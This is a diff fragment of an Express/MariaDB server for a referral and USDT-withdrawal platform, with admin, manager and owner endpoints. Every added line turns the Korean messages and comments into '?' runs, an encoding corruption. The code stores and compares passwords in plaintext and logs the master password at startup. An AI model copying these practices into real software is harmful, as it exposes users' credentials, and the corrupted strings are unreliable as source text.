+    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
     await db.pool.query('DELETE FROM popups WHERE id=?', [req.params.id]);
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// ========== 어드민: 다운로드 CRUD ==========
+// ========== ???: ???? CRUD ==========
 
 app.get('/api/admin/downloads', requireAdmin, async (req, res) => {
   try {
@@ -4638,9 +4825,9 @@ app.get('/api/admin/downloads', requireAdmin, async (req, res) => {
 
 app.post('/api/admin/downloads', requireAdmin, async (req, res) => {
   try {
-    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
+    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
     const { title, url, description, sort_order, active } = req.body || {};
-    if (!title?.trim() || !url?.trim()) return res.status(400).json({ error: '제목과 URL을 입력하세요.' });
+    if (!title?.trim() || !url?.trim()) return res.status(400).json({ error: '??? URL? ?????.' });
     const [r] = await db.pool.query(
       `INSERT INTO downloads (title, url, description, sort_order, active) VALUES (?,?,?,?,?)`,
       [title.trim(), url.trim(), description||null, sort_order||0, active === false ? 0 : 1]
@@ -4651,7 +4838,7 @@ app.post('/api/admin/downloads', requireAdmin, async (req, res) => {
 
 app.patch('/api/admin/downloads/:id', requireAdmin, async (req, res) => {
   try {
-    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
+    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
     const { title, url, description, sort_order, active } = req.body || {};
     const fields = []; const vals = [];
     if (title       !== undefined) { fields.push('title=?');       vals.push(title||''); }
@@ -4659,7 +4846,7 @@ app.patch('/api/admin/downloads/:id', requireAdmin, async (req, res) => {
     if (description !== undefined) { fields.push('description=?'); vals.push(description||null); }
     if (sort_order  !== undefined) { fields.push('sort_order=?');  vals.push(sort_order||0); }
     if (active      !== undefined) { fields.push('active=?');      vals.push(active ? 1 : 0); }
-    if (!fields.length) return res.status(400).json({ error: '변경 항목 없음' });
+    if (!fields.length) return res.status(400).json({ error: '?? ?? ??' });
     vals.push(req.params.id);
     await db.pool.query(`UPDATE downloads SET ${fields.join(',')} WHERE id=?`, vals);
     res.json({ ok: true });
@@ -4668,21 +4855,21 @@ app.patch('/api/admin/downloads/:id', requireAdmin, async (req, res) => {
 
 app.delete('/api/admin/downloads/:id', requireAdmin, async (req, res) => {
   try {
-    if (req.admin.role !== 'master') return res.status(403).json({ error: '마스터만 가능' });
+    if (req.admin.role !== 'master') return res.status(403).json({ error: '???? ??' });
     await db.pool.query('DELETE FROM downloads WHERE id=?', [req.params.id]);
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// ========== 오너 자신 계정 수정 ==========
+// ========== ?? ?? ?? ?? ==========
 
-// ─────────────────────────────────────────────
-// 매니저가 owner 페이지에서 사용하는 전용 API
-// ─────────────────────────────────────────────
+// ?????????????????????????????????????????????
+// ???? owner ????? ???? ?? API
+// ?????????????????????????????????????????????
 
-// GET /api/owner/mgr/settlements — 본인 정산 내역 (매니저 전용)
+// GET /api/owner/mgr/settlements ? ?? ?? ?? (??? ??)
 app.get('/api/owner/mgr/settlements', requireOwnerSession, async (req, res) => {
-  if (req.owner.role !== 'manager') return res.status(403).json({ error: '매니저 전용' });
+  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
   try {
     const page     = Math.max(1, parseInt(req.query.page)     || 1);
     const pageSize = Math.min(50, parseInt(req.query.pageSize) || 20);
@@ -4700,9 +4887,9 @@ app.get('/api/owner/mgr/settlements', requireOwnerSession, async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// GET /api/owner/mgr/withdrawals — 본인 출금 내역 (매니저 전용)
+// GET /api/owner/mgr/withdrawals ? ?? ?? ?? (??? ??)
 app.get('/api/owner/mgr/withdrawals', requireOwnerSession, async (req, res) => {
-  if (req.owner.role !== 'manager') return res.status(403).json({ error: '매니저 전용' });
+  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
   try {
     const [rows] = await db.pool.query(
       'SELECT id, amount, wallet_address, status, reject_reason, requested_at, processed_at FROM withdrawal_requests WHERE manager_id = ? ORDER BY requested_at DESC',
@@ -4714,25 +4901,25 @@ app.get('/api/owner/mgr/withdrawals', requireOwnerSession, async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// POST /api/owner/mgr/withdrawals — 출금 신청 (매니저 전용)
+// POST /api/owner/mgr/withdrawals ? ?? ?? (??? ??)
 app.post('/api/owner/mgr/withdrawals', requireOwnerSession, async (req, res) => {
-  if (req.owner.role !== 'manager') return res.status(403).json({ error: '매니저 전용' });
+  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
   try {
     const { amount, wallet_address } = req.body || {};
-    if (!amount || isNaN(amount) || Number(amount) <= 0) return res.status(400).json({ error: '금액을 입력하세요.' });
+    if (!amount || isNaN(amount) || Number(amount) <= 0) return res.status(400).json({ error: '??? ?????.' });
     const mid = req.owner.id;
     const [[te]] = await db.pool.query('SELECT COALESCE(SUM(settlement_amount),0) AS v FROM settlements WHERE manager_id=?', [mid]);
     const [[tw]] = await db.pool.query("SELECT COALESCE(SUM(amount),0) AS v FROM withdrawal_requests WHERE manager_id=? AND status IN ('approved','pending')", [mid]);
     const balance = Number(te.v) - Number(tw.v);
-    if (Number(amount) > balance) return res.status(400).json({ error: `출금 가능 잔액 초과 (잔액: ${balance.toFixed(4)} USDT)` });
+    if (Number(amount) > balance) return res.status(400).json({ error: `?? ?? ?? ?? (??: ${balance.toFixed(4)} USDT)` });
     await db.pool.query('INSERT INTO withdrawal_requests (manager_id, amount, wallet_address) VALUES (?, ?, ?)', [mid, Number(amount), wallet_address?.trim() || null]);
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// GET /api/owner/mgr/owners — 본인 소속 오너 목록 (매니저 전용)
+// GET /api/owner/mgr/owners ? ?? ?? ?? ?? (??? ??)
 app.get('/api/owner/mgr/owners', requireOwnerSession, async (req, res) => {
-  if (req.owner.role !== 'manager') return res.status(403).json({ error: '매니저 전용' });
+  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
   try {
     const [rows] = await db.pool.query(
       `SELECT o.id, o.name, o.telegram, o.status, o.created_at,
@@ -4746,15 +4933,15 @@ app.get('/api/owner/mgr/owners', requireOwnerSession, async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// POST /api/owner/mgr/owners — 새 오너 생성 (매니저 자신을 referral)
+// POST /api/owner/mgr/owners ? ? ?? ?? (??? ??? referral)
 app.post('/api/owner/mgr/owners', requireOwnerSession, async (req, res) => {
-  if (req.owner.role !== 'manager') return res.status(403).json({ error: '매니저 전용' });
+  if (req.owner.role !== 'manager') return res.status(403).json({ error: '??? ??' });
   try {
     const { id, password, name, telegram } = req.body || {};
-    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: 'ID와 비밀번호는 필수입니다.' });
+    if (!id?.trim() || !password?.trim()) return res.status(400).json({ error: 'ID? ????? ?????.' });
     const ownerId = id.trim().toLowerCase();
     const [[exists]] = await db.pool.query('SELECT id FROM account_owners WHERE id = ?', [ownerId]);
-    if (exists) return res.status(400).json({ error: '이미 사용 중인 아이디입니다.' });
+    if (exists) return res.status(400).json({ error: '?? ?? ?? ??????.' });
     await db.pool.query(
       'INSERT INTO account_owners (id, pw, name, telegram, manager_id, status) VALUES (?, ?, ?, ?, ?, ?)',
       [ownerId, password.trim(), name?.trim() || null, telegram?.trim() || null, req.owner.id, 'approved']
@@ -4763,27 +4950,27 @@ app.post('/api/owner/mgr/owners', requireOwnerSession, async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// PATCH /api/owner/me — 오너/매니저 자신의 계정 정보 수정
+// PATCH /api/owner/me ? ??/??? ??? ?? ?? ??
 app.patch('/api/owner/me', async (req, res) => {
   try {
     const authHeader = req.headers.authorization || '';
     const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : '';
-    if (!token) return res.status(401).json({ error: '인증 필요' });
+    if (!token) return res.status(401).json({ error: '?? ??' });
     const [[sess]] = await db.pool.query(
       'SELECT owner_id FROM owner_sessions WHERE token=?', [token]
     );
-    if (!sess) return res.status(401).json({ error: '세션 만료' });
+    if (!sess) return res.status(401).json({ error: '?? ??' });
 
     const ownerId = sess.owner_id;
     const { name, telegram, password, new_password } = req.body || {};
 
-    // 비밀번호 변경 시 현재 비밀번호 검증
+    // ???? ?? ? ?? ???? ??
     if (new_password?.trim()) {
-      if (!password?.trim()) return res.status(400).json({ error: '현재 비밀번호를 입력하세요.' });
-      // account_owners 확인
+      if (!password?.trim()) return res.status(400).json({ error: '?? ????? ?????.' });
+      // account_owners ??
       const [[ownerRow]] = await db.pool.query('SELECT id FROM account_owners WHERE id=? AND pw=?', [ownerId, password.trim()]);
       const [[mgrRow]]   = await db.pool.query("SELECT id FROM managers WHERE id=? AND pw=? AND role='manager'", [ownerId, password.trim()]);
-      if (!ownerRow && !mgrRow) return res.status(400).json({ error: '현재 비밀번호가 올바르지 않습니다.' });
+      if (!ownerRow && !mgrRow) return res.status(400).json({ error: '?? ????? ???? ????.' });
 
       if (ownerRow) {
         await db.pool.query('UPDATE account_owners SET pw=? WHERE id=?', [new_password.trim(), ownerId]);
@@ -4793,7 +4980,7 @@ app.patch('/api/owner/me', async (req, res) => {
       }
     }
 
-    // 이름/텔레그램 업데이트
+    // ??/???? ????
     const [[existsOwner]] = await db.pool.query('SELECT id FROM account_owners WHERE id=?', [ownerId]);
     if (existsOwner) {
       const fields = []; const vals = [];
@@ -4801,7 +4988,7 @@ app.patch('/api/owner/me', async (req, res) => {
       if (telegram !== undefined) { fields.push('telegram=?'); vals.push(telegram||null); }
       if (fields.length) { vals.push(ownerId); await db.pool.query(`UPDATE account_owners SET ${fields.join(',')} WHERE id=?`, vals); }
     }
-    // 매니저인 경우 admins 테이블 telegram 업데이트
+    // ???? ?? admins ??? telegram ????
     const [[existsMgr]] = await db.pool.query("SELECT id FROM managers WHERE id=? AND role='manager'", [ownerId]);
     if (existsMgr && telegram !== undefined) {
       await db.pool.query("UPDATE managers SET telegram=? WHERE id=? AND role='manager'", [telegram||null, ownerId]);
@@ -4811,14 +4998,14 @@ app.patch('/api/owner/me', async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// 서버 시작
+// ?? ??
 app.listen(PORT, () => {
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log('✅ 서버 실행 중!');
+  console.log('????????????????????????????????????????');
+  console.log('? ?? ?? ?!');
   console.log('');
-  console.log('🌐 URL: http://localhost:' + PORT);
-  console.log('👤 관리자: http://localhost:' + PORT + '/admin.html');
-  console.log('🔑 마스터: ' + MASTER_ID + ' / ' + MASTER_PW);
-  console.log('💾 데이터베이스: MariaDB 연결됨');
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+  console.log('?? URL: http://localhost:' + PORT);
+  console.log('?? ???: http://localhost:' + PORT + '/admin.html');
+  console.log('?? ???: ' + MASTER_ID + ' / ' + MASTER_PW);
+  console.log('?? ??????: MariaDB ???');
+  console.log('????????????????????????????????????????');
 });
